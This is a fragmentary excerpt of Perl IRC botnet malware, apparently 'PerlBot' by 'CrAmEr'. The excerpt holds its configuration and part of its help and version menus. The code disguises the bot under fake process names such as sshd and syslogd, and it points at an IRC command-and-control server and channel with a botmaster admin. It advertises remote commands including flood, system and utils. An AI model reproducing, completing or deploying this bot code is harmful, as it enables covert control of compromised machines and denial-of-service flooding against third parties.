...
my @rps = ("/usr/sbin/sshd -i","/usr/sbin/sshd","/usr/sbin/sshd -D","/sbin/syslogd","/sbin/klogd -c 1 -x -x","/usr/sbin/acpid");
...
$server = '192.168.51.5.' unless $server;
my $port = '6667';
my $linas_max='8';
my $sleep='5';
my $homedir = "/var/tmp";
...
my @admins = ("botmaster");
my @hostauth = ("localhost", "192.168.51.5");
my @channels = ("#bash");
my $pacotes = 1;
#################################################################
...
if ($funcarg =~ /^help/) {
        ...
        sendraw($IRC_cur_socket, "PRIVMSG $printl :[Help] 	 PerlBot Main Help:");
        sendraw($IRC_cur_socket, "PRIVMSG $printl :[Help] =========================");
        sendraw($IRC_cur_socket, "PRIVMSG $printl :[Help] !x 12@9,1system       ");
        sendraw($IRC_cur_socket, "PRIVMSG $printl :[Help] !x 12@9,1version      ");
        sendraw($IRC_cur_socket, "PRIVMSG $printl :[Help] !x 12@9,1channel      ");
        sendraw($IRC_cur_socket, "PRIVMSG $printl :[Help] !x 12@9,1flood        ");
        sendraw($IRC_cur_socket, "PRIVMSG $printl :[Help] !x 12@9,1utils        ");
        sendraw($IRC_cur_socket, "PRIVMSG $printl :[Help] =========================");
}
...
if ($funcarg =~ /^system/) {
        ...
        sendraw($IRC_cur_socket, "PRIVMSG $printl :[System]   ps Bot Configuration: ");
        sendraw($IRC_cur_socket, "PRIVMSG $printl :[System] ============================");
...
if ($funcarg =~ /^version/){
        sendraw($IRC_cur_socket, "PRIVMSG $printl :[Version] 9,1==================================");
        sendraw($IRC_cur_socket, "PRIVMSG $printl :[Version] 9,1    ps Bot Informations:      ");
        sendraw($IRC_cur_socket, "PRIVMSG $printl :[Version] 9,1==================================");
        sendraw($IRC_cur_socket, "PRIVMSG $printl :[Version] 9,1*Bot Version : 12$version        ");
        sendraw($IRC_cur_socket, "PRIVMSG $printl :[Version] 9,1*Bot Creator : 12CrAmEr          ");
        sendraw($IRC_cur_socket, "PRIVMSG $printl :[Version] 9,1*Bot Year    : 122012            ");
        sendraw($IRC_cur_socket, "PRIVMSG $printl :[Version] 9,1==================================");
}
